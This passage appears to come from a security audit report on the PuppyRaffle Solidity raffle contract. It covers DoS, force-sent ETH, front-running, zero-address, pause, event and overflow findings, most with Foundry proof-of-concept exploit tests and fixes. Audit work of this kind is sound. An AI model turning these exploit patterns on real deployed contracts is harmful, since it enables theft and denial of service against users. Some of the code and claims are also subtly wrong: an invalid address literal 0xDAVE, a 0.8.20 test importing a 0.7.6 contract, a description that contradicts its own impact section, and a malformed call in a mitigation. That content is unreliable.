By continuously adding a large number of unique addresses the attacker can bloat `players` until the quadratic duplicate-check exceeds the block gas limit. From that moment no one (including the attacker) can call `enterRaffle`, so the on-going raffle is closed to new participants and the attacker controls almost the entire ticket pool. The raffle will eventually finish after `raffleDuration`, but the inability for other users to join breaks liveness and fairness of the game rather than locking funds forever.

## Proof of Concept
1. Deploy `PuppyRaffle` with an entrance fee of 1 ether.
2. The attacker repeats the following step ~300–400 times (exact number depends on the chain gas limit):
   a. Call `enterRaffle` with one fresh address and send 1 ether.
3. Because each call iterates over the whole `players` array, gas usage grows quadratically.
4. Once the array is big enough, every further `enterRaffle` call (including those from innocent users) runs out of gas and reverts, effectively freezing new entries.
5. After `raffleDuration` the attacker (or anyone else) can still call `selectWinner`, but only the already inserted accounts take part, giving the attacker an overwhelming probability of winning.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract DosGasGriefingTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;

    function setUp() public {
        // feeAddress and raffleDuration are dummy values for testing
        raffle = new PuppyRaffle(FEE, address(0xdead), 1 days);
    }

    function _join(address p) internal {
        address[] memory arr = new address[](1);
        arr[0] = p;
        vm.prank(p);
        raffle.enterRaffle{value: FEE}(arr);
    }

    function test_cannotJoinAfterBloat() public {
        // Bloat the array with many players controlled by attacker
        for (uint256 i; i < 300; i++) {
            address a = address(uint160(i + 1));
            vm.deal(a, FEE);
            _join(a);
        }

        // Victim tries to join with a limited gas stipend
        address victim = address(0xBEEF);
        vm.deal(victim, FEE);
        address[] memory arr = new address[](1);
        arr[0] = victim;

        vm.prank(victim);
        vm.expectRevert();
        // supply only 3m gas – more than enough for a normal join but
        // not enough after the array has been bloated
        raffle.enterRaffle{value: FEE, gas: 3_000_000}(arr);
    }
}

## Suggested Mitigation
Keep a mapping `mapping(address => bool) public isPlayer;` and validate `require(!isPlayer[player],"duplicate");` before pushing a player. Clear the mapping when the raffle is reset (inside `selectWinner` and when a player refunds). This reduces the check to O(1) per address and removes the gas-based DoS vector.

## [M-3]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function uses a strict equality check `require(address(this).balance == uint256(totalFees), ...)` to ensure fees can only be withdrawn when no raffle is active. However, this check is brittle. If any ETH is forcibly sent to the contract (e.g., via `selfdestruct` or a miner assigning block rewards in a future network update), the contract's balance will become greater than `totalFees`. This will cause the equality check to fail permanently, making it impossible to withdraw any accumulated fees.

## Impact
All current and future fees collected by the protocol will be permanently locked in the contract. The owner will be unable to access their legitimate revenue.

## Proof of Concept
Instead of a regular value-transfer, use a self-destructing helper contract to force 1 wei into PuppyRaffle. This bypasses the missing receive/fallback functions and guarantees the balance exceeds totalFees, permanently breaking the strict equality check.

1. Finish at least one raffle so that `totalFees > 0`.
2. Deploy `ForceSend` with 1 wei and call `destroy(address(raffle))` – the self-destruct will force-send the wei.
3. `address(raffle).balance == totalFees + 1 wei` now holds.
4. Owner (or `feeAddress`) calls `withdrawFees()`, which reverts on the brittle equality check, locking all fees forever.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract ForceSend {
    constructor() payable {}
    function destroy(address payable to) external { selfdestruct(to); }
}

contract UnexpectedEthTest is Test {
    PuppyRaffle raffle;
    address feeAddress = address(0xBEEF);
    uint256 constant ENTRANCE_FEE = 1 ether;

    function setUp() public {
        // deploy the raffle
        raffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, 1 days);

        // add the minimum 4 players
        for (uint256 i; i < 4; i++) {
            address player = vm.addr(i + 1);
            vm.deal(player, ENTRANCE_FEE);
            address[] memory arr = new address[](1);
            arr[0] = player;
            vm.prank(player);
            raffle.enterRaffle{value: ENTRANCE_FEE}(arr);
        }

        // finish the raffle so fees are collected
        vm.warp(block.timestamp + 1 days + 1);
        raffle.selectWinner();
    }

    function testFeeWithdrawalRevertsAfterForcedEth() public {
        uint256 fees = raffle.totalFees();
        assertGt(fees, 0);

        // force-send 1 wei
        ForceSend fs = new ForceSend{value: 1 wei}();
        fs.destroy(payable(address(raffle)));

        assertEq(address(raffle).balance, fees + 1, "balance should now exceed tracked fees");

        // owner / feeAddress tries to withdraw and reverts
        vm.prank(feeAddress);
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
The check in `withdrawFees` should be less strict. Instead of checking for exact equality, it should allow withdrawal of the tracked `totalFees` amount, leaving any extra ETH in the contract. A better check is to ensure that there are no active players, which can be done by checking `players.length`.

```solidity
function withdrawFees() external {
    // A better check is to ensure no raffle is in progress.
    require(players.length == 0, "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = uint256(totalFees);
    require(feesToWithdraw > 0, "PuppyRaffle: No fees to withdraw");
    totalFees = 0;

    (bool success, ) = feeAddress.call{value: feesToWithdraw}();
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```
This revised logic correctly checks the raffle's state and is not vulnerable to funds getting locked by accidental or malicious ETH transfers.

## [M-4]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::refund

## Description
A user's attempt to refund their entry fee via the `refund` function can be front-run by a MEV (Miner Extractable Value) bot or a malicious user. If a user submits a `refund` transaction, an observer can see it in the mempool. If the raffle period has ended, the observer can submit a `selectWinner` transaction with a higher gas fee to get it mined first. The `selectWinner` function deletes the `players` array, causing the user's subsequent `refund` transaction to fail. The user loses their chance to get a refund and also loses their entry fee if they are not chosen as the winner.

## Impact
Users can be maliciously prevented from getting a refund they are entitled to, leading to a loss of their entry fee. This undermines the fairness of the refund mechanism.

## Proof of Concept
After the raffle duration has elapsed, but before anyone has called selectWinner, a player sends a refund() transaction. A bot sees this pending tx and instead calls selectWinner first. Because selectWinner deletes the players array, the later refund() execution will hit an out-of-bounds read (players[playerIndex]) and revert, permanently preventing the player from recovering the entrance fee.

## Proof of Code
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RefundFrontRunTest is Test {
    PuppyRaffle raffle;
    address fee = address(0xFEE);
    uint256 entrance = 1 ether;
    uint256 duration = 1 days;

    address alice = address(0xA11CE);
    address bob   = address(0xB0B);
    address charlie = address(0xC0FFEE);
    address dave  = address(0xDAVE);

    function setUp() public {
        raffle = new PuppyRaffle(entrance, fee, duration);

        address[] memory players = new address[](4);
        players[0] = alice;
        players[1] = bob;
        players[2] = charlie;
        players[3] = dave;

        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);
        vm.deal(charlie, 10 ether);
        vm.deal(dave, 10 ether);

        raffle.enterRaffle{value: entrance * 4}(players);
    }

    function testRefundGetsFrontRun() public {
        // Move past raffle end
        vm.warp(block.timestamp + duration + 1);

        // Alice determines her index before broadcasting refund
        uint256 idx = raffle.getActivePlayerIndex(alice);

        // MEV bot front-runs with selectWinner (needs >=4 players so ok)
        raffle.selectWinner();

        // Alice's refund now reverts because players array is empty
        vm.startPrank(alice);
        vm.expectRevert(); // generic revert – out-of-bounds panic
        raffle.refund(idx);
        vm.stopPrank();
    }
}

## Suggested Mitigation
To prevent this specific front-running vector, disallow refunds after the raffle has officially ended. Add a check in the `refund` function to ensure it's called before the deadline.

```solidity
function refund(uint256 playerIndex) public {
    require(block.timestamp < raffleStartTime + raffleDuration, "PuppyRaffle: Raffle has ended");
    address playerAddress = players[playerIndex];
    // ... rest of the function
}
```
This ensures a clear cut-off point, after which refunds are no longer possible and `selectWinner` is fair game to be called.

## [M-5]. DOS issue in PuppyRaffle::refund

## Description
The `refund` function sets a player's entry in the `players` array to `address(0)` rather than removing the element. If the `selectWinner` function happens to pick an index corresponding to a refunded player, the `winner` variable will be `address(0)`. The subsequent prize transfer `winner.call{value: prizePool}("")` will fail because Ether cannot be sent to the zero address. This causes the entire `selectWinner` transaction to revert, stalling the conclusion of the raffle.

## Impact
If the pseudo-random pick lands on a slot that was cleared by refund(), the winner becomes address(0). The subsequent _safeMint(winner,tokenId) call in selectWinner() reverts with "ERC721: mint to the zero address", rolling back the whole transaction. Until a transaction is mined where the modulo result is a non-empty slot the raffle cannot be closed, blocking prize distribution and fee withdrawal (permanent DoS if enough holes are created).

## Proof of Concept
1. Four users enter the raffle (indices 0-3).
2. Index 0 user refunds; players[0] == address(0).
3. Anyone calls selectWinner() in a block whose (msg.sender, timestamp) combination makes keccak256(..) % 4 == 0.
4. winner == address(0).
5. _safeMint(address(0), tokenId) reverts -> raffle stuck.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RefundDosTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;
    uint256 constant DURATION = 1 days;

    address p1 = address(0x1);
    address p2 = address(0x2);
    address p3 = address(0x3);
    address p4 = address(0x4);

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(this), DURATION);
        address[] memory entrants = new address[](4);
        entrants[0] = p1; entrants[1] = p2; entrants[2] = p3; entrants[3] = p4;
        raffle.enterRaffle{value: FEE*4}(entrants);
        vm.prank(p1);
        raffle.refund(0);                 // players[0] = address(0)
        vm.warp(block.timestamp + DURATION + 1);
    }

    function testSelectWinnerRevertsWhenZeroPicked() public {
        address caller = address(0xAA);
        uint256 ts = block.timestamp;
        uint256 difficulty = block.difficulty;
        uint256 targetTs;
        for (uint256 i; i < 5000; ++i) {
            if (uint256(keccak256(abi.encodePacked(caller, ts+i, difficulty))) % 4 == 0) {
                targetTs = ts + i;
                break;
            }
        }
        vm.startPrank(caller);
        vm.warp(targetTs);
        vm.expectRevert("ERC721: mint to the zero address");
        raffle.selectWinner();
        vm.stopPrank();
    }
}

## Suggested Mitigation
Either (1) compact the array on refund() (swap-and-pop) so no zero holes remain, or (2) in selectWinner() loop/re-draw until winner != address(0). Prefer option (1) as it also keeps players.length accurate for fee accounting.



# Low Risk Findings

## [L-1]. Pausable Emergency Stop issue in PuppyRaffle::NA

## Description
The contract owner has significant responsibilities, such as managing the fee address. However, there is no emergency stop or pause mechanism. If a severe vulnerability (like the ones identified in this audit) is discovered after deployment, the owner has no way to halt the contract's functions. Users could continue to deposit funds into a compromised contract, and attackers could continue to exploit it.

## Impact
The inability to pause the contract in an emergency can lead to significant financial losses for users and the protocol owner. It removes a critical layer of risk management, leaving the contract and its users exposed until a new version can be deployed and users migrated, which is a slow and often incomplete process.

## Proof of Concept
1. A critical vulnerability is discovered in `selectWinner` that allows an attacker to drain the entire prize pool.
2. The owner is notified but cannot take any action to prevent the `selectWinner` function from being called.
3. The attacker repeatedly calls `selectWinner` at the end of each raffle period, draining the prize money before the owner can warn the community.
4. Legitimate users continue to enter the raffle, unaware that their funds are at high risk.

## Proof of Code
// This is a conceptual issue, not demonstrated by a single failing test.
// The absence of a modifier like `whenNotPaused` on critical functions is the vulnerability.

// Example of vulnerable function without a pause guard:
/*
function enterRaffle(address[] calldata newPlayers) public payable {
    // ... logic ...
}

function selectWinner() public {
    // ... logic ...
}
*/

## Suggested Mitigation
Inherit from OpenZeppelin's `Pausable` contract and apply the `whenNotPaused` modifier to all critical functions that perform state changes or handle funds (`enterRaffle`, `selectWinner`, `refund`, `withdrawFees`). This allows the owner to pause the contract in an emergency, preventing further damage.

```solidity
import "@openzeppelin/contracts/utils/Pausable.sol";

contract PuppyRaffle is ERC721, Ownable, Pausable {
    // ...

    function enterRaffle(address[] calldata newPlayers) public payable whenNotPaused {
        // ...
    }

    function selectWinner() public whenNotPaused {
        // ...
    }

    function refund(uint256 playerIndex) public whenNotPaused {
        // ...
    }

    function withdrawFees() public whenNotPaused {
        // ...
    }

    // Owner can pause and unpause the contract
    function pause() public onlyOwner {
        _pause();
    }

    function unpause() public onlyOwner {
        _unpause();
    }
}
```

## [L-2]. Event Consistency issue in PuppyRaffle::selectWinner, withdrawFees

## Description
Several functions that perform critical state changes do not emit events. Specifically, `selectWinner` determines the winner, calculates fees, and resets the raffle, but does not emit a summary event. `withdrawFees` transfers the accumulated fees to the owner and resets the `totalFees` counter to zero, also without an event. This lack of event emission makes it difficult for off-chain services, dApps, and users to monitor the contract's activity and history.

## Impact
The absence of events for critical operations reduces transparency and makes the contract harder to integrate with. Off-chain monitoring tools, user interfaces, and data analytics platforms rely on events to track activity without having to inspect individual transactions. This omission increases the complexity and cost for developers building on or monitoring the protocol.

## Proof of Concept
1. The `selectWinner` function is called. A winner is chosen, a prize is sent, and an NFT is minted. The ERC721 `Transfer` event is emitted, but there is no single event indicating who won the raffle, the prize amount, and the NFT ID.
2. A front-end application wants to display a list of past winners and their prizes. To do this, it would have to re-execute `selectWinner` calls historically or parse transaction traces, which is inefficient and unreliable.
3. The owner calls `withdrawFees`. The balance of the fee address increases, but no event is logged on-chain, making it hard to track when and how much was withdrawn.

## Proof of Code
// This is a conceptual issue of missing code, not a failing test.
// The proof is the absence of `emit` statements in the functions.

/*
// In selectWinner()
// ... logic ...
(bool success, ) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
_safeMint(winner, tokenId);
// MISSING EVENT: Should be something like emit WinnerSelected(winner, tokenId, prizePool);

// In withdrawFees()
(bool success, ) = feeAddress.call{value: feesToWithdraw}("");
require(success, "PuppyRaffle: Failed to withdraw fees");
// MISSING EVENT: Should be something like emit FeesWithdrawn(feeAddress, feesToWithdraw);
*/

## Suggested Mitigation
Add and emit events for all critical state changes.

```solidity
// Add events to the contract definition
event WinnerSelected(address indexed winner, uint256 indexed tokenId, uint256 prizeAmount);
event FeesWithdrawn(address indexed feeAddress, uint256 amount);

// In selectWinner function
// ... after winner is decided and prize is calculated
_safeMint(winner, tokenId);
emit WinnerSelected(winner, tokenId, prizePool);

// In withdrawFees function
// ... after fees are calculated
(bool success, ) = feeAddress.call{value: feesToWithdraw}("");
require(success, "PuppyRaffle: Failed to withdraw fees");
emit FeesWithdrawn(feeAddress, feesToWithdraw);
```

## [L-3]. Event Consistency issue in PuppyRaffle::selectWinner

## Description
Critical state changes in the contract do not emit events, which harms observability and makes it difficult for off-chain services and users to track the contract's activity. The `selectWinner` function, which is the most critical function in the contract, does not emit an event to announce the winner, the prize amount, and the NFT that was minted. Similarly, `withdrawFees` does not emit an event.

## Impact
Lack of events for critical actions makes it hard for users to verify the outcome of the raffle and for dApp frontends to display information in real-time. It forces reliance on expensive off-chain indexing of function calls rather than lightweight event listeners, and reduces the overall transparency of the protocol.

## Proof of Concept
1. A user participates in the raffle.
2. After the raffle period ends, `selectWinner` is called.
3. The user has no easy, on-chain way of being notified that a winner has been chosen or who the winner was. They would have to manually call view functions or inspect the transaction trace on a block explorer.

## Proof of Code
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract EventConsistencyTest is Test {
    PuppyRaffle raffle;
    address feeReceiver = address(0xfee);
    uint256 entrance = 1 ether;
    uint256 duration = 1 days;

    function setUp() public {
        raffle = new PuppyRaffle(entrance, feeReceiver, duration);

        address[] memory players = new address[](4);
        players[0] = vm.addr(1);
        players[1] = vm.addr(2);
        players[2] = vm.addr(3);
        players[3] = vm.addr(4);

        vm.deal(address(this), 10 ether);
        raffle.enterRaffle{value: entrance * 4}(players);
    }

    function testSelectWinner_EmitsNoEvent() public {
        vm.warp(block.timestamp + duration + 1);

        // Record all logs during the call
        vm.recordLogs();
        raffle.selectWinner();
        Vm.Log[] memory logs = vm.getRecordedLogs();

        // Expecting at least one event announcing the winner, but none is emitted
        assertEq(logs.length, 0, "selectWinner() should emit an event but does not");
    }
}

## Suggested Mitigation
Emit dedicated events for every critical state-changing action so that off-chain indexers and UIs can react efficiently.

Example:

    event WinnerSelected(address indexed winner, uint256 indexed tokenId, uint256 prizePool);
    event FeesWithdrawn(address indexed to, uint256 amount);

    function selectWinner() external { /* …existing logic… */ emit WinnerSelected(winner, tokenId, prizePool); }

    function withdrawFees() external onlyOwner {
        uint256 amount = totalFees; totalFees = 0; (bool s,) = feeAddress.call{value: amount}(""); require(s, "transfer failed");
        emit FeesWithdrawn(feeAddress, amount);
    }



# Info Risk Findings

## [I-1]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses a floating pragma `pragma solidity ^0.7.6;`. This allows the contract to be compiled with any compiler version from `0.7.6` up to, but not including, `0.8.0`. Different compiler versions may have different bugs or generate slightly different bytecode, leading to uncertainty about the exact code running on-chain. Best practice is to lock the pragma to a single, specific compiler version that has been used for testing and auditing.

## Impact
Using a floating pragma can lead to deployment with an unintended Solidity version, potentially introducing compiler-specific bugs. It makes bytecode verification more difficult as developers must guess which version was used. This reduces the determinism and reliability of the build process.

## Proof of Concept
1. The contract is developed and tested with compiler version `0.7.6`.
2. A deployment script uses a newer tool that defaults to the latest compatible compiler, `0.7.9` (hypothetically).
3. The contract is deployed with `0.7.9`, which may have a subtle, unknown bug or optimization change that affects contract behavior.
4. The deployed contract's behavior does not exactly match the tested version, leading to potential vulnerabilities.

## Proof of Code
// The vulnerability is the line of code itself.
// src/PuppyRaffle.sol:4
// pragma solidity ^0.7.6;

## Suggested Mitigation
Lock the pragma to a specific, well-tested Solidity version. This ensures that the contract is always compiled with the exact same compiler, producing deterministic bytecode and avoiding unexpected issues from compiler updates.

```solidity
// Change this:
pragma solidity ^0.7.6;

// To this:
pragma solidity 0.7.6;
```

## [I-2]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses an old, fixed pragma `solidity 0.7.6;`. While using a fixed pragma is a good practice, version 0.7.6 is outdated. It lacks important safety features introduced in Solidity 0.8.x, such as built-in overflow and underflow checks for arithmetic operations. Relying on an old compiler version exposes the contract to known and potentially unknown bugs of that specific version.

## Impact
Because the contract is compiled with Solidity 0.7.6, arithmetic operations do not automatically revert on overflow / underflow. If the owner accidentally (or maliciously) sets `entranceFee` to a value greater than `2**255` an attacker can exploit wrap-around behaviour in `enterRaffle` and pay far less ether than intended. Although this requires an unrealistic configuration that can only be introduced by the owner, it still represents unexpected behaviour and loss of funds. No cross-user attack exists under normal parameters.

## Proof of Concept
1. Owner deploys the contract with `entranceFee = 2**255 + 1` (or any value > 2**255).
2. Attacker prepares an array with two new players and calls `enterRaffle`.
   • In Solidity 0.7 the check `msg.value == entranceFee * newPlayers.length` is evaluated *after* multiplication wraps.  
   • `entranceFee * 2` becomes `(2**255 + 1) * 2 = 2**256 + 2 ≡ 2 (mod 2**256)`.
3. Therefore the attacker only has to send **2 wei** instead of the enormous intended amount and still passes the `require` check, entering the raffle essentially for free.

## Proof of Code
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract OverflowEnterRaffle is Test {
    PuppyRaffle raffle;
    address p1 = address(0x1);
    address p2 = address(0x2);

    function setUp() public {
        uint256 huge = (uint256(1) << 255) + 1; // 2**255 + 1
        raffle = new PuppyRaffle(huge, address(this), 1 days);
    }

    function test_enterRaffleWithOverflow() public {
        address[] memory arr = new address[](2);
        arr[0] = p1;
        arr[1] = p2;

        // Only 2 wei required because multiplication overflows inside the contract.
        vm.deal(address(this), 2);
        raffle.enterRaffle{value: 2}(arr);

        assertEq(address(raffle).balance, 2, "Raffle balance should equal msg.value sent");
    }
}

## Suggested Mitigation
Migrate to Solidity ≥0.8.0 or add explicit SafeMath / checked-arithmetic libraries for all numerical operations. This removes wrap-around behaviour independant of compiler version.



